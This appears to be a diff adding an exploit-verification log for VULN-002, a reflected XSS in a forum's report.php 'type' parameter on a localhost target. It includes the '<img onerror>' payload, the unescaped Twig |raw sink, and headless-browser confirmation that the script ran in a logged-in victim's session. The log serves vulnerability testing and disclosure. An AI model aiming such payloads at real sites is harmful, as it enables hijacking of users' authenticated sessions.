@@ -1,0 +1,16 @@
+========================================================================
+VULN-002: Reflected XSS in report.php?type= (any logged-in victim)
+Target: http://localhost:25850
+========================================================================
+[INFO] exercising report.php type-reflection -> report.twig:15 |raw sink
+[SETUP] creating an ordinary forum user victim_9fb1ecb3 to act as the lured victim (report.php:19 requires a logged-in uid; attacker needs no account)
+[INFO] victim uid=7, session cookie obtained
+[STEP] GET /report.php?type=<payload> as the victim (type = "<img src=x onerror=alert('xssfa5cd4')>")
+[INFO] HTTP 200; raw payload present=True; html-escaped=False
+[PROOF] payload reflected verbatim inside <div class="row row--form">…</div> (report.twig:15 |raw) — the '<img onerror>' tag reaches the DOM unescaped
+[STEP] launching headless Chromium (Playwright container) with the victim cookie
+    DIALOG_FIRED msg="localhost" window.__xss="xssfa5cd4" marker="xssfa5cd4"
+[PROOF] Chromium executed the injected script: an alert() dialog fired in the victim's authenticated session (screenshot in evidence/xss_fired.png)
+------------------------------------------------------------------------
+[OK] exploit confirmed — payload reflected unescaped AND executed in-browser
+==> VULN-002: CONFIRMED — reflected XSS executes JS in a logged-in victim's session
